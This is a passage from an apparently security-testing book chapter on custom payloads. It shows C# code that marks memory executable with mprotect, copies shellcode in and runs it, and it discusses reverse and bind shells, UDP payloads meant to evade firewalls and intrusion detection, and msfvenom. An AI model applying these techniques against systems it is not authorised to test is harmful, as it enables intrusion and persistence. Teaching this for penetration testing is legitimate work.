class="calibre_6">Because of the way Linux allocates memory in pages, we must change the mode for the entire memory page where our payload memory was allocated. The bitwise AND with the ones’ complement of the current pagesize will round the memory address given to us by <span class="calibre4">posix_memalign()</span> down to the beginning of the memory page where the pointer resides. This allows us to set the mode for the full memory page being used by the memory allocated by <span class="calibre4">posix_memalign()</span>.</p><p class="calibre_6">We also create the mode to set the memory to by performing an OR operation on the values <span class="calibre4">0x04</span> (read), <span class="calibre4">0x02</span> (write), and <span class="calibre4">0x01</span> (execute) and storing the value from the OR operations in the <span class="calibre4">mode</span> variable ➋. Finally, we call <span class="calibre4">mprotect()</span> ➌ by passing the aligned pointer of the memory page, the alignment of the memory (as passed into the <span class="calibre4">posix_memalign()</span> function), and the mode to set the memory to. Like the <span class="calibre4">posix_memalign()</span> function, <span class="calibre4">IntPtr.Zero</span> is returned if <span class="calibre4">mprotect()</span> successfully changes the mode of the memory page. If <span class="calibre4">IntPtr.Zero</span> is not returned, we print an error message and return to exit the payload.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Copying and Executing the Payload</span></span></p><p class="calibre_11">We are now set up to copy our payload into our memory space and execute the code, as shown in <a href="#filepos417127">Listing 4-31</a>.</p><blockquote class="calibre_14"><span class="calibre4"> ➊Marshal.Copy(payload, 0, ptr, payload.Length);</span><br class="calibre5"/><span class="calibre4"> LinuxRun r = (LinuxRun)➋Marshal.GetDelegateForFunctionPointer(ptr, typeof(LinuxRun));</span><br class="calibre5"/><span class="calibre4"> r();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> finally</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> if (freeMe)</span><br class="calibre5"/><span class="calibre4"> ➌free(ptr);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos417127" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-31: Copying the payload to the allocated memory and executing the payload</span></span></p><p class="calibre_6">The last few lines of <a href="#filepos417127">Listing 4-31</a> should look similar to the code we wrote to execute the Windows payload (<a href="#filepos401856">Listing 4-26</a>). The <span class="calibre4">Marshal.Copy()</span> method ➊ copies our payload into our allocated memory buffer and the <span class="calibre4">Marshal.GetDelegateForFunctionPointer()</span> method ➋ turns the payload in memory into a delegate that we can call from our managed code. Once we have a delegate pointing to our code in memory, we call it in order to execute the code. A <span class="calibre4">finally</span> block following the <span class="calibre4">try</span> block frees the memory allocated by <span class="calibre4">posix_memalign()</span> if <span class="calibre4">freeMe</span> is set to <span class="calibre4">true</span> ➌.</p><p class="calibre_6">Finally, we add our generated Windows and Linux payloads to the cross-platform payload, which allows us to compile and run the same payload on either Windows or Linux.</p><p id="filepos418314" class="calibre_10"><span class="calibre3"><span class="bold"> Conclusion</span></span></p><p class="calibre_11">In this chapter, we discussed a few different ways to create custom payloads that are useful in a variety of circumstances.</p><p class="calibre_6">Payloads that utilize TCP can provide benefits when you are attacking a network, from getting a shell from an internal network to maintaining persistence. Using a connect-back technique, you can achieve a shell on a remote box, thus aiding in a phishing campaign, for example, where a pentest is completely external from the network. A bind technique, on the other hand, can help you maintain persistence on boxes without having to exploit the vulnerability on the machine again if internal access to the network is available.</p><p class="calibre_6">Payloads that communicate over UDP can often get around poorly configured firewalls and might be able to bypass an intrusion detection system focused on TCP traffic. Although less reliable than TCP, UDP offers the speed and stealth that the heavily scrutinized TCP generally can’t provide. By using a UDP payload that listens for incoming broadcasts, attempts to execute the commands sent, and then broadcasts the results back you, your attacks can be a bit quieter and possibly stealthier at the expense of stability.</p><p class="calibre_6">Metasploit allows an attacker to create many types of payloads on the fly, and it’s easy to install and get running. Metasploit includes the <span class="calibre4">msfvenom</span> tool, which creates and encodes payloads for use in exploits. Using the <span class="calibre4">msfvenom</span> tool to generate native assembly payloads, you can build a small, cross-platform executable to detect and run shellcode for a variety of operating systems. This gives you great flexibility in the payloads that are run on a target’s box. It also makes use of one of the most powerful and useful Metasploit features available.</p><div class="mbp_pagebreak" id="calibre_pb_9"/>
</body></html>